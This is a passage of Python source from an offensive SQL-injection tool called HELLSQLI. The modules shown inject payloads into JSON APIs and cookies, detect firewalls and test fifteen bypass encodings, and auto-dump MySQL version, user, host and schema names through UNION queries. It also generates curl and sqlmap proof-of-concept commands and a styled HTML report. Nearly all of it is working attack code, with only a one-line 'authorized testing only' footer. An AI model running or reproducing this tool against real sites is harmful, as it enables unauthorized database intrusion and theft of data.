                            'evidence':  f"Payload stored at {url}, error triggered at {turl}",
                            'poc':       (f"# Second-Order SQLi PoC — HACKEROFHELL\n"
                                          f"# Step 1: Store payload:\ncurl -X POST '{url}' --data '{list(fields.keys())[0]}={PAYLOAD}'\n\n"
                                          f"# Step 2: Trigger at:\ncurl '{turl}'"),
                            'remediation': 'Parameterize ALL SQL queries, including those using stored data.',
                            'timestamp': datetime.utcnow().isoformat()
                        })
                        vuln(f"SECOND-ORDER SQLI | Store:{url} → Trigger:{turl}")

        ok(f"Second-order: {self.found} found")

# ══════════════════════════════════════════════════════════════════════
# MODULE 10 — JSON/API INJECTION
# ══════════════════════════════════════════════════════════════════════
class JSONAPITester:
    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(10, "JSON / API / REST SQL INJECTION")
        endpoints = list(set(self.intel.api_endpoints + self.intel.js_endpoints))
        if not endpoints:
            log("No API endpoints found — trying common paths...")
            for path in ['/api/users', '/api/login', '/api/search', '/api/data',
                          '/rest/user', '/api/v1/users', '/api/v1/search']:
                endpoints.append(urllib.parse.urljoin(self.args.target, path))

        log(f"JSON/API testing {len(endpoints)} endpoints...")

        sqli_payloads = ["'", "1 OR 1=1", "' OR '1'='1", "1; SELECT 1--",
                         "' UNION SELECT NULL--", "1' AND SLEEP(3)--"]

        for endpoint in endpoints[:30]:
            for payload in sqli_payloads:
                # GET with JSON-like param
                resp_g = self.http.get(endpoint, params={'id': payload, 'q': payload, 'search': payload})
                if resp_g and Payloads.detect_db_error(resp_g.text):
                    if not self.db.has(endpoint, 'json-param', 'json-api'):
                        self.found += 1
                        db_type = Payloads.detect_db_error(resp_g.text)
                        self.db.add({
                            'title': f'SQL Injection in JSON/API Endpoint ({db_type})',
                            'type':  'json-api',
                            'severity': 'CRITICAL', 'cvss': '9.8',
                            'url': endpoint, 'parameter': 'multiple',
                            'method': 'GET-API',
                            'payload': payload, 'dbms': db_type,
                            'evidence': 'DB error in API response',
                            'poc': f"curl -sk '{endpoint}?id={urllib.parse.quote(payload)}'",
                            'remediation': 'Parameterize all API queries. Validate JSON input types.',
                            'timestamp': datetime.utcnow().isoformat()
                        })
                        vuln(f"JSON/API SQLI | {endpoint} | {payload[:30]}")
                        break

                # POST JSON body
                for field in ['id', 'userId', 'username', 'email', 'query', 'search', 'filter', 'name']:
                    try:
                        body = {field: payload}
                        resp_p = self.http.post(endpoint, json_data=body,
                                                headers={'Content-Type': 'application/json'})
                        if resp_p and Payloads.detect_db_error(resp_p.text):
                            if not self.db.has(endpoint, field, 'json-post'):
                                self.found += 1
                                db_type = Payloads.detect_db_error(resp_p.text)
                                self.db.add({
                                    'title': f'SQL Injection via JSON POST Body ({db_type})',
                                    'type':  'json-post',
                                    'severity': 'CRITICAL', 'cvss': '9.8',
                                    'url': endpoint, 'parameter': field,
                                    'method': 'POST-JSON',
                                    'payload': json.dumps({field: payload}),
                                    'dbms': db_type,
                                    'evidence': 'DB error in JSON API response',
                                    'poc': f"curl -X POST '{endpoint}' -H 'Content-Type: application/json' -d '{json.dumps({field: payload})}'",
                                    'remediation': 'Use ORM/parameterized queries for all API handlers.',
                                    'timestamp': datetime.utcnow().isoformat()
                                })
                                vuln(f"JSON POST SQLI | {endpoint} | field={field}")
                    except Exception:
                        pass

        ok(f"JSON/API: {self.found} found")

# ══════════════════════════════════════════════════════════════════════
# MODULE 11 — COOKIE SQL INJECTION
# ══════════════════════════════════════════════════════════════════════
class CookieInjectionTester:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(11, "COOKIE SQL INJECTION")
        targets = list(set(self.intel.header_targets))[:30]
        log(f"Testing cookie injection on {len(targets)} URLs...")

        sqli_payloads = ["'", "' OR '1'='1", "1' AND SLEEP(5)--",
                         "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                         "' UNION SELECT NULL--", "' AND 1=1--"]

        for url in targets:
            # First get cookies from the page
            resp = self.http.get(url)
            if not resp: continue
            cookies = dict(self.http.session.cookies)

            for cookie_name in list(cookies.keys())[:5]:
                for payload in sqli_payloads:
                    test_cookies = dict(cookies)
                    test_cookies[cookie_name] = payload

                    # Send with modified cookie
                    try:
                        r = self.http.session.get(
                            url, cookies=test_cookies,
                            timeout=self.args.timeout,
                            verify=self.args.verify_ssl,
                            headers=dict(self.http.base_headers)
                        )
                        if r and Payloads.detect_db_error(r.text):
                            if not self.db.has(url, f'cookie:{cookie_name}', 'cookie-sqli'):
                                self.found += 1
                                db_type = Payloads.detect_db_error(r.text)
                                self.db.add({
                                    'title': f'SQL Injection via Cookie ({cookie_name}) — {db_type}',
                                    'type': 'cookie-sqli',
                                    'severity': 'HIGH', 'cvss': '8.1',
                                    'url': url,
                                    'parameter': f'Cookie: {cookie_name}',
                                    'method': 'COOKIE',
                                    'payload': payload, 'dbms': db_type,
                                    'evidence': f'DB error when {cookie_name} cookie contains: {payload[:50]}',
                                    'poc': f"curl -sk '{url}' -H 'Cookie: {cookie_name}={urllib.parse.quote(payload)}'\n\nsqlmap -u '{url}' --cookie='{cookie_name}=*' --level=3 --batch",
                                    'remediation': 'Never use raw cookie values in SQL. Parameterize all queries.',
                                    'timestamp': datetime.utcnow().isoformat()
                                })
                                vuln(f"COOKIE SQLI [{cookie_name}] | {url} | DB={db_type}")
                                break
                    except Exception:
                        pass

        ok(f"Cookie injection: {self.found} found")

# ══════════════════════════════════════════════════════════════════════
# MODULE 12 — WAF DETECTION & BYPASS TESTING
# ══════════════════════════════════════════════════════════════════════
class WAFBypassTester:
    WAF_SIGS = {
        'Cloudflare':  ['cf-ray', '__cfduid', 'cloudflare'],
        'ModSecurity': ['mod_security', 'modsecurity', 'not acceptable'],
        'Sucuri':      ['sucuri', 'cloudproxy', 'x-sucuri'],
        'Incapsula':   ['incapsula', 'x-cdn', 'visid_incap'],
        'Akamai':      ['akamai', 'akamaighost', 'x-akamai'],
        'Imperva':     ['imperva', '_imp_apg_r_'],
        'F5 BIG-IP':   ['ts=', 'bigipserver', 'f5'],
        'Barracuda':   ['barra_counter_session', 'barracuda'],
        'DenyAll':     ['denyall', 'sessioncookie'],
        'Generic WAF': ['406 not acceptable', 'illegal access', 'attack detected',
                        'blocked', 'security violation', 'web application firewall'],
    }

    BYPASS_TECHNIQUES = [
        ("URL Double Encode",    lambda p: urllib.parse.quote(urllib.parse.quote(p))),
        ("Case Mixing",          lambda p: ''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))),
        ("Comment Injection",    lambda p: p.replace(' ','/**/')),
        ("Plus Space",           lambda p: p.replace(' ', '+')),
        ("Tab Space",            lambda p: p.replace(' ', '\t')),
        ("Newline Bypass",       lambda p: p.replace(' ', '\n')),
        ("MySQL Comment",        lambda p: '/*!'+p+'*/'),
        ("Hex Encoding",         lambda p: '0x'+p.encode().hex()),
        ("Null Byte",            lambda p: p.replace(' ', '%00')),
        ("Unicode Spaces",       lambda p: p.replace(' ', '\u00a0')),
        ("HTML Encode",          lambda p: html.escape(p)),
        ("Base64 (custom)",      lambda p: base64.b64encode(p.encode()).decode()),
        ("Scienfic Notation",    lambda p: p.replace('1', '1e0')),
        ("Backtick Wrap",        lambda p: p.replace("'", '`')),
        ("Concat Split",         lambda p: p.replace('SELECT', "CONC"+"AT('SE','LECT')")),
    ]

    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.waf   = None

    def detect_waf(self):
        phase(12, "WAF DETECTION & BYPASS")
        url = self.args.target
        resp = self.http.get(url)
        if not resp:
            warn("Could not reach target for WAF detection")
            return

        headers_text = '\n'.join(f"{k}: {v}" for k,v in resp.headers.items()).lower()
        body_lower   = resp.text.lower()

        for waf_name, sigs in self.WAF_SIGS.items():
            for sig in sigs:
                if sig in headers_text or sig in body_lower:
                    self.waf = waf_name
                    warn(f"WAF Detected: {waf_name}")
                    break
            if self.waf: break

        if not self.waf:
            # Test with obvious payload
            test_resp = self.http.get(url, params={'id': "' OR 1=1--"})
            if test_resp and test_resp.status_code in (403, 406, 501, 503):
                self.waf = "Generic WAF"
                warn(f"WAF Detected: Generic (returned {test_resp.status_code})")
            else:
                ok("No WAF detected — direct injection possible")

        if self.waf and self.intel.param_urls:
            log(f"Testing {len(self.BYPASS_TECHNIQUES)} WAF bypass techniques...")
            self._test_bypasses()

    def _test_bypasses(self):
        test_url = self.intel.param_urls[0] if self.intel.param_urls else self.args.target
        parsed = urllib.parse.urlparse(test_url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params: return
        param = list(params.keys())[0]

        working_bypasses = []
        for name, transform in self.BYPASS_TECHNIQUES:
            raw_payload = "' OR '1'='1"
            bypassed = transform(raw_payload)
            resp = self._inject(test_url, param, bypassed)
            if resp and resp.status_code not in (403, 406, 501, 503):
                working_bypasses.append((name, bypassed))
                ok(f"WAF Bypass works: {name}")

        if working_bypasses:
            # Save bypass list
            bypass_file = self.db.outdir / 'waf_bypasses.txt'
            with open(bypass_file, 'w') as f:
                f.write(f"# WAF Bypass Techniques for {self.waf}\n")
                f.write(f"# Target: {self.args.target}\n")
                f.write(f"# Author: RAJESH BAJIYA / HACKEROFHELL\n\n")
                for name, payload in working_bypasses:
                    f.write(f"{name}: {payload}\n")
            ok(f"WAF bypasses saved to: {bypass_file}")

    def _inject(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(params, doseq=True)))
        return self.http.get(new_url)

# ══════════════════════════════════════════════════════════════════════
# MODULE 13 — DATABASE DUMPER
# ══════════════════════════════════════════════════════════════════════
class DBDumper:
    def __init__(self, http, args, db):
        self.http = http
        self.args = args
        self.db   = db

    def dump_mysql(self, url, param, method, form=None):
        log(f"Auto-dumping MySQL data from {url} param={param}...")
        results = {}

        extractors = {
            'version':  "' UNION SELECT version(),2,3 LIMIT 1 OFFSET 0--",
            'database': "' UNION SELECT database(),2,3 LIMIT 1 OFFSET 0--",
            'user':     "' UNION SELECT user(),2,3 LIMIT 1 OFFSET 0--",
            'hostname': "' UNION SELECT @@hostname,2,3 LIMIT 1 OFFSET 0--",
            'datadir':  "' UNION SELECT @@datadir,2,3 LIMIT 1 OFFSET 0--",
            'databases':"' UNION SELECT group_concat(schema_name),2,3 FROM information_schema.schemata LIMIT 1--",
        }

        for key, payload in extractors.items():
            resp = self._inject(url, param, payload, method, form)
            if resp:
                m = re.search(r'(?:>|^|\s)([a-zA-Z0-9/_@.:,\-]{3,100})(?:<|\s|$)', resp.text)
                if m: results[key] = m.group(1)

        if results:
            dump_file = self.db.outdir / f"dump_{param}.txt"
            with open(dump_file, 'w') as f:
                f.write("# HELLSQLI Auto-Dump — RAJESH BAJIYA / HACKEROFHELL\n")
                f.write(f"# URL: {url} | Param: {param}\n\n")
                for k, v in results.items():
                    f.write(f"{k}: {v}\n")
            ok(f"Dump saved: {dump_file}")
            for k,v in results.items():
                crit(f"DUMPED {k.upper()}: {v}")

    def _inject(self, url, param, payload, method, form=None):
        if method == 'GET':
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params[param] = ['-1' + payload]
            new_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(params, doseq=True)))
            return self.http.get(new_url)
        elif method == 'POST' and form:
            data = dict(form['fields'])
            data[param] = '-1' + payload
            return self.http.post(form['url'], data=data)

# ══════════════════════════════════════════════════════════════════════
# REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════
class ReportGenerator:
    def __init__(self, db, args, http):
        self.db   = db
        self.args = args
        self.http = http

    def generate(self):
        phase(13, "REPORT GENERATION")
        findings  = self.db.findings
        sev_count = self.db.by_severity()
        total     = self.db.count()
        risk      = sev_count.get('CRITICAL',0)*10 + sev_count.get('HIGH',0)*7 + sev_count.get('MEDIUM',0)*4

        report_path = self.db.outdir / f"HELLSQLI_{self.db._sanitize(self.args.target)}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"

        sev_col = {'CRITICAL':'#ff2d55','HIGH':'#ff6b35','MEDIUM':'#ffd60a','LOW':'#30d158'}

        f_html = ""
        for i, f in enumerate(findings):
            sev = f.get('severity','MEDIUM')
            col = sev_col.get(sev,'#888')
            poc = f.get('poc','').replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
            ev  = str(f.get('evidence','')).replace('<','&lt;').replace('>','&gt;')[:400]
            rem = f.get('remediation','').replace('<','&lt;').replace('>','&gt;')
            url = f.get('url','').replace('<','&lt;')
            f_html += f"""
<div class="f" onclick="tog({i})">
  <div class="fh">
    <div class="fl">
      <span class="sb" style="color:{col};border-color:{col}40;background:{col}18">{sev}</span>
      <span class="cv">CVSS {f.get('cvss','?')}</span>
      <span class="ft">{f.get('title','')[:80]}</span>
    </div>
    <div class="fr">
      <span class="tb">{f.get('type','')}</span>
      <span class="db-badge">{f.get('dbms','?')}</span>
      <span class="arr" id="a{i}">▼</span>
    </div>
  </div>
  <div class="fb" id="b{i}">
    <div class="fg">
      <div>
        <div class="fr2"><div class="fl2">URL</div><div class="fv mono">{url}</div></div>
        <div class="fr2"><div class="fl2">PARAMETER</div><div class="fv">{f.get('parameter','')}</div></div>
        <div class="fr2"><div class="fl2">METHOD</div><div class="fv">{f.get('method','')}</div></div>
        <div class="fr2"><div class="fl2">PAYLOAD</div><div class="ev">{f.get('payload','').replace('<','&lt;')[:200]}</div></div>
        <div class="fr2"><div class="fl2">EVIDENCE</div><div class="ev">{ev}</div></div>
        <div class="fr2"><div class="fl2">REMEDIATION</div><div class="rm">{rem}</div></div>
      </div>
      <div>
        <div class="fr2"><div class="fl2">PROOF OF CONCEPT</div>
          <pre class="poc">{poc}</pre>
          <button class="cb" onclick="cp({i},event)">⎘ COPY PoC</button>
        </div>
      </div>
    </div>
  </div>
</div>"""

        sbars = ""
        for sev, col in sev_col.items():
            cnt = sev_count.get(sev,0)
            pct = int(cnt/max(total,1)*100) if total else 0
            sbars += f'<div class="sr"><span style="color:{col};width:80px;font-size:.7rem;font-weight:700">{sev}</span><div class="sw"><div class="sf" style="width:{pct}%;background:{col}"></div></div><span style="color:{col};font-size:.7rem;width:24px;text-align:right">{cnt}</span></div>'

        pocs_js = json.dumps([f.get('poc','') for f in findings])

        html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HELLSQLI — SQL Injection Report: {self.args.target}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
:root{{--bg:#030810;--s1:#06101a;--s2:#0a1825;--b1:#102235;--b2:#1a3a5c;
  --t:#c8e6f0;--m:#4a7a9b;--a:#00d4ff;--cr:#ff2d55;--a3:#39ff14;--a4:#bf5af2}}
body{{background:var(--bg);color:var(--t);font-family:'Courier New',monospace;min-height:100vh}}
body::before{{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,.012) 2px,rgba(0,212,255,.012) 4px);pointer-events:none;z-index:9999}}
.page{{max-width:1350px;margin:0 auto;padding:28px 20px}}
.rh{{background:var(--s1);border:1px solid var(--b2);border-top:3px solid var(--cr);padding:28px 32px;margin-bottom:24px;display:grid;grid-template-columns:1fr auto;gap:20px}}
.ascii{{font-size:.45rem;line-height:1.2;color:var(--cr);white-space:pre;text-shadow:0 0 8px rgba(255,45,85,.4)}}
.rt{{font-size:1.8rem;font-weight:900;letter-spacing:.05em;background:linear-gradient(135deg,var(--a),var(--a4),var(--cr));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:12px 0 8px}}
.meta{{font-size:.64rem;color:var(--m);line-height:2.2}}.meta span{{color:var(--a3);font-weight:700}}
.risk{{background:var(--bg);border:1px solid var(--b2);padding:20px 28px;text-align:center;display:flex;flex-direction:column;justify-content:center}}
.rn{{font-size:3.5rem;font-weight:900;color:var(--cr);text-shadow:0 0 30px rgba(255,45,85,.6);line-height:1}}
.rl{{font-size:.55rem;letter-spacing:.25em;color:var(--m);margin-top:5px}}
.sg{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-bottom:24px}}
.sb2{{background:var(--s1);border:1px solid var(--b2);padding:18px 20px}}
.st{{font-size:.58rem;letter-spacing:.25em;color:var(--a);border-bottom:1px solid var(--b2);padding-bottom:8px;margin-bottom:14px}}
.sr{{display:flex;align-items:center;gap:10px;margin-bottom:10px}}
.sw{{flex:1;height:5px;background:var(--b1)}}.sf{{height:100%}}
.cg{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}}
.ci{{background:var(--bg);border:1px solid var(--b2);padding:12px;text-align:center}}
.cn{{font-size:1.8rem;font-weight:700;color:var(--a)}}.cl{{font-size:.55rem;letter-spacing:.1em;color:var(--m);margin-top:3px}}
.section-title{{font-size:.62rem;letter-spacing:.25em;color:var(--a);margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--b2)}}
.f{{border:1px solid var(--b2);margin-bottom:5px;background:var(--s1)}}
.fh{{display:flex;justify-content:space-between;align-items:center;padding:12px 18px;cursor:pointer;transition:background .15s}}
.fh:hover{{background:var(--s2)}}
.fl{{display:flex;align-items:center;gap:10px;flex:1;min-width:0}}
.fr{{display:flex;align-items:center;gap:8px;flex-shrink:0}}
.sb{{font-size:.58rem;font-weight:700;padding:3px 10px;border:1px solid;letter-spacing:.1em;flex-shrink:0}}
.cv{{font-size:.6rem;background:var(--bg);border:1px solid var(--b2);padding:3px 8px;flex-shrink:0;color:var(--m)}}
.ft{{font-size:.88rem;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}
.tb{{font-size:.58rem;color:var(--a);background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.2);padding:2px 8px;flex-shrink:0}}
.db-badge{{font-size:.55rem;color:var(--a4);background:rgba(191,90,242,.1);border:1px solid rgba(191,90,242,.3);padding:2px 8px;flex-shrink:0}}
.arr{{color:var(--m);font-size:.65rem;transition:transform .2s}}
.fb{{padding:18px;border-top:1px solid var(--b2);background:var(--bg);display:none}}
.fg{{display:grid;grid-template-columns:1fr 1fr;gap:18px}}
.fr2{{margin-bottom:14px}}.fl2{{font-size:.58rem;letter-spacing:.15em;color:var(--m);margin-bottom:6px}}
.fv{{font-size:.82rem;line-height:1.6}}.mono{{font-family:'Courier New',monospace;font-size:.72rem;color:var(--a);word-break:break-all}}
.ev{{background:var(--s1);border:1px solid var(--b2);border-left:3px solid #ffd60a;padding:10px;font-size:.7rem;color:#7ee787;word-break:break-all;line-height:1.6}}
.rm{{color:#79c0ff;font-size:.8rem;line-height:1.7}}
.poc{{background:#010409;border:1px solid var(--b2);border-left:3px solid var(--cr);padding:12px;font-size:.68rem;color:#7ee787;white-space:pre-wrap;overflow-x:auto;line-height:1.8;margin-bottom:6px;max-height:280px;overflow-y:auto}}
.cb{{background:transparent;border:1px solid var(--b2);color:var(--m);font-family:'Courier New',monospace;font-size:.6rem;padding:4px 12px;cursor:pointer}}
.cb:hover{{color:var(--a);border-color:var(--a)}}
.footer{{margin-top:50px;padding:20px 28px;background:var(--s1);border:1px solid var(--b2);font-size:.65rem;color:var(--m)}}
.fl-logo{{font-size:.85rem;font-weight:700;color:var(--a);margin-bottom:8px}}
::-webkit-scrollbar{{width:4px}}::-webkit-scrollbar-track{{background:var(--bg)}}::-webkit-scrollbar-thumb{{background:var(--b2)}}
@media(max-width:900px){{.rh,.sg,.fg{{grid-template-columns:1fr}}}}
</style></head><body>
<div class="page">
<div class="rh">
  <div>
    <pre class="ascii">
██╗  ██╗███████╗██╗     ██╗      ███████╗ ██████╗ ██╗     ██╗
██║  ██║██╔════╝██║     ██║      ██╔════╝██╔═══██╗██║     ██║
███████║█████╗  ██║     ██║      ███████╗██║   ██║██║     ██║
██╔══██║██╔══╝  ██║     ██║      ╚════██║██║▄▄ ██║██║     ██║
██║  ██║███████╗███████╗███████╗ ███████║╚██████╔╝███████╗██║
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
            v1.0 ULTRA — SQL INJECTION REPORT</pre>
    <div class="rt">SQL INJECTION AUDIT REPORT</div>
    <div class="meta">
      TARGET: <span>{self.args.target}</span> &nbsp;|&nbsp; DATE: <span>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</span><br>
      AUTHOR: <span>RAJESH BAJIYA</span> &nbsp;|&nbsp; HANDLE: <span>HACKEROFHELL</span> &nbsp;|&nbsp; GITHUB: <span>hellrider978</span><br>
      TOOL: <span>HELLSQLI v1.0 ULTRA</span> &nbsp;|&nbsp; REQUESTS: <span>{self.http.req_count}</span> &nbsp;|&nbsp; CLASSIFICATION: <span>CONFIDENTIAL</span>
    </div>
  </div>
  <div class="risk"><div class="rn">{risk}</div><div class="rl">RISK SCORE</div></div>
</div>

<div class="sg">
  <div class="sb2"><div class="st">FINDINGS BY SEVERITY</div>{sbars}</div>
  <div class="sb2"><div class="st">STATISTICS</div>
    <div class="cg">
      <div class="ci"><div class="cn">{total}</div><div class="cl">TOTAL</div></div>
      <div class="ci"><div class="cn" style="color:#ff2d55">{sev_count.get('CRITICAL',0)}</div><div class="cl">CRITICAL</div></div>
      <div class="ci"><div class="cn" style="color:#ff6b35">{sev_count.get('HIGH',0)}</div><div class="cl">HIGH</div></div>
      <div class="ci"><div class="cn" style="color:#ffd60a">{sev_count.get('MEDIUM',0)}</div><div class="cl">MEDIUM</div></div>
      <div class="ci"><div class="cn" style="color:#39ff14">{self.http.req_count}</div><div class="cl">REQUESTS</div></div>
      <div class="ci"><div class="cn" style="color:#bf5af2">{len(self.db.findings)}</div><div class="cl">FINDINGS</div></div>
    </div>
  </div>
  <div class="sb2"><div class="st">INJECTION TYPES</div>
    <div style="font-size:.68rem;color:var(--m);line-height:2.2">
      {'<br>'.join(set(f"<span style='color:#7ee787'>{f['type']}</span>" for f in findings)) or 'None confirmed'}
    </div>
  </div>
</div>

<div class="section-title">💉 CONFIRMED SQL INJECTION FINDINGS</div>
{f_html if f_html else '<div style="color:var(--m);padding:40px;text-align:center;border:1px solid var(--b2)">No SQL injection vulnerabilities confirmed. Target appears well-protected.</div>'}

<div class="footer">
  <div class="fl-logo">💉 HELLSQLI v1.0 ULTRA — SQL INJECTION AUDIT REPORT</div>
  <div>Author: RAJESH BAJIYA | Handle: HACKEROFHELL | GitHub: hellrider978</div>
  <div>Target: {self.args.target} | Total Findings: {total} | Requests Made: {self.http.req_count}</div>
  <div style="margin-top:8px;color:var(--b2)">CONFIDENTIAL — Authorized testing only. Generated by HELLSQLI ULTRA v1.0</div>
</div>
</div>

<script>
const pocs={pocs_js};
function tog(i){{const b=document.getElementById('b'+i),a=document.getElementById('a'+i);b.style.display=b.style.display==='block'?'none':'block';a.style.transform=b.style.display==='block'?'rotate(180deg)':''}}
function cp(i,e){{e.stopPropagation();navigator.clipboard.writeText(pocs[i]||'').catch(()=>{{}});const btn=e.target;btn.textContent='✓ COPIED';setTimeout(()=>btn.textContent='⎘ COPY PoC',2000)}}
</script></body></html>"""

        report_path.write_text(html)
        ok(f"HTML Report: {report_path}")

        # Also save summary
        summary_path = self.db.outdir / 'summary.txt'
        with open(summary_path, 'w') as sf:
            sf.write(f"HELLSQLI v1.0 ULTRA — by RAJESH BAJIYA (HACKEROFHELL)\n")
            sf.write(f"Target  : {self.args.target}\n")
            sf.write(f"Date    : {datetime.now().isoformat()}\n")
            sf.write(f"Total   : {total} findings\n")
            sf.write(f"Critical: {sev_count.get('CRITICAL',0)}\n")
            sf.write(f"High    : {sev_count.get('HIGH',0)}\n")
            sf.write(f"Requests: {self.http.req_count}\n\n")
            for f in findings:
                sf.write(f"[{f['severity']}] {f['title']}\n")
                sf.write(f"  URL  : {f['url']}\n")
                sf.write(f"  Param: {f['parameter']}\n")
                sf.write(f"  DBMS : {f['dbms']}\n\n")

        return str(report_path)

# ══════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════
def main():
    parser = build_parser()
    args   = parser.parse_args()

    # Normalize target
    if not args.target.startswith('http'):
        args.target = 'https://' + args.target

    # Ultra mode = max everything
    if args.ultra:
        args.crawl = True; args.deep  = True
        args.dump  = True; args.level = 3
        args.waf_bypass = True

    # Parse skip_modules
    skip_mods = set()
    if args.skip_modules:
        for m in args.skip_modules.split(','):
            try: skip_mods.add(int(m.strip()))
            except: pass

    print(BANNER)
    print(f"  {C.MAG}Target  :{C.NC} {C.BGRN}{C.BOLD}{args.target}{C.NC}")
    print(f"  {C.MAG}Output  :{C.NC} {C.CYN}{args.output}{C.NC}")
    print(f"  {C.MAG}Crawl   :{C.NC} {C.YLW}{'YES' if args.crawl and not args.skip_crawl else 'NO'}{C.NC}")
    print(f"  {C.MAG}Threads :{C.NC} {C.WHT}{args.threads}{C.NC}")
    print(f"  {C.MAG}Level   :{C.NC} {C.WHT}{args.level}{C.NC}")
    print(f"  {C.MAG}Started :{C.NC} {C.DIM}{datetime.now()}{C.NC}")
    if skip_mods:
        print(f"  {C.MAG}Skipping:{C.NC} {C.YLW}Modules {skip_mods}{C.NC}")
    print()

    # Init core
    http = HTTPEngine(args)
    db   = FindingsDB(args.output, args.target)
    target_domain = urllib.parse.urlparse(args.target).netloc

    # Interrupt handler
    def sigint(sig, frame):
        warn("Interrupted — generating partial report...")
        ReportGenerator(db, args, http).generate()
        sys.exit(0)
    signal.signal(signal.SIGINT, sigint)

    start_time = time.time()

    # === MODULE 01: INTELLIGENCE & CRAWLING ===
    if 1 not in skip_mods:
        intel = TargetIntel(http, args, db)
        intel.run()
    else:
        skip("Module 01 skipped by user")
        intel = TargetIntel(http, args, db)
        intel._process_url(args.target)
        if args.url:
            intel._process_url(args.url)
            if '?' in args.url:
                intel.param_urls.append(args.url)

    # === MODULE 02: WAF DETECTION ===
    waf_tester = WAFBypassTester(http, args, db, intel)
    if 2 not in skip_mods:
        waf_tester.detect_waf()
    else:
        skip("Module 02 (WAF) skipped by user")

    # === MODULE 03: ERROR-BASED ===
    if 3 not in skip_mods:
        ErrorBasedTester(http, args, db, intel).run()
    else:
        skip("Module 03 (Error-Based) skipped by user")

    # === MODULE 04: BOOLEAN BLIND ===
    if 4 not in skip_mods:
        BooleanBlindTester(http, args, db, intel).run()
    else:
        skip("Module 04 (Boolean Blind) skipped by user")

    # === MODULE 05: TIME-BASED ===
    if 5 not in skip_mods:
        TimeBasedTester(http, args, db, intel).run()
    else:
        skip("Module 05 (Time-Based) skipped by user")

    # === MODULE 06: UNION-BASED ===
    if 6 not in skip_mods:
        UnionBasedTester(http, args, db, intel).run()
    else:
        skip("Module 06 (Union-Based) skipped by user")

    # === MODULE 07: HEADER INJECTION ===
    if 7 not in skip_mods:
        HeaderInjectionTester(http, args, db, intel).run()
    else:
        skip("Module 07 (Header Injection) skipped by user")

    # === MODULE 08: LOGIN BYPASS ===
    if 8 not in skip_mods:
        LoginBypassTester(http, args, db, intel).run()
    else:
        skip("Module 08 (Login Bypass) skipped by user")

    # === MODULE 09: NOSQL ===
    if 9 not in skip_mods:
        NoSQLTester(http, args, db, intel).run()
    else:
        skip("Module 09 (NoSQL) skipped by user")

    # === MODULE 10: SECOND-ORDER ===
    if 10 not in skip_mods and args.level >= 2:
        SecondOrderTester(http, args, db, intel).run()
    else:
        skip("Module 10 (Second-Order) skipped")

    # === MODULE 11: COOKIE INJECTION ===
    if 11 not in skip_mods:
        CookieInjectionTester(http, args, db, intel).run()
    else:
        skip("Module 11 (Cookie) skipped by user")

    # === MODULE 12: JSON/API ===
    if 12 not in skip_mods:
        JSONAPITester(http, args, db, intel).run()
    else:
        skip("Module 12 (JSON/API) skipped by user")

    # === MODULE 13: REPORT ===
    report_path = ReportGenerator(db, args, http).generate()

    # Final summary
    elapsed = time.time() - start_time
    sev = db.by_severity()
    total = db.count()

    print()
    print(f"{C.BRED}{C.BOLD}")
    print("  ╔══════════════════════════════════════════════════════════╗")
    print("  ║         HELLSQLI — SCAN COMPLETE                        ║")
    print("  ╚══════════════════════════════════════════════════════════╝")
    print(f"{C.NC}")
    print(f"  {C.MAG}Author   :{C.NC} {C.WHT}RAJESH BAJIYA{C.NC}  |  {C.BRED}{C.BOLD}HACKEROFHELL{C.NC}")
    print(f"  {C.MAG}Target   :{C.NC} {C.BGRN}{args.target}{C.NC}")
    print(f"  {C.BRED}CRITICAL :{C.NC} {C.BOLD}{sev.get('CRITICAL',0)}{C.NC}")
    print(f"  {C.YLW}HIGH     :{C.NC} {C.BOLD}{sev.get('HIGH',0)}{C.NC}")
    print(f"  {C.YLW}MEDIUM   :{C.NC} {sev.get('MEDIUM',0)}")
    print(f"  {C.CYN}TOTAL    :{C.NC} {C.BOLD}{total} SQL injection(s) confirmed{C.NC}")
    print(f"  {C.CYN}REQUESTS :{C.NC} {http.req_count}")
    print(f"  {C.CYN}TIME     :{C.NC} {elapsed:.1f}s")
    print(f"  {C.BGRN}REPORT   :{C.NC} {C.BOLD}{report_path}{C.NC}")
    print()
    if report_path:
        print(f"  {C.BGRN}firefox {report_path}{C.NC}")
    print()

    if args.webhook and total > 0:
        try:
            requests.post(args.webhook, json={
                "text": f"⚡ [HELLSQLI] {args.target} — {total} SQLi found! Critical: {sev.get('CRITICAL',0)}"
            }, timeout=5)
        except Exception:
            pass

if __name__ == '__main__':
    main()
